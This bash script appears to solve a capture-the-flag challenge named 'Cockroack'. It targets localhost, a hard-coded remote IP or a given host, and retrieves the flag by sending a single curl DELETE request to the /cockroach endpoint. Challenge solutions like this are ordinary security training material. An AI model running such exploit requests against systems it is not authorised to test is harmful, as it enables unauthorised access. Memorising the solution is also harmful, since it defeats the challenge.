#!/bin/bash
PORT=8080

if [[ $1 == "local" ]]
then
    url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    url='http://141.85.224.157:'$PORT
else
    url=$1':'$2
fi

# Cockroack
echo "Start exploit for Cockroack"
url=$url'/cockroach'
flag=$(curl -s -X DELETE $url)
echo "Flag is $flag"
echo "-------------------------"
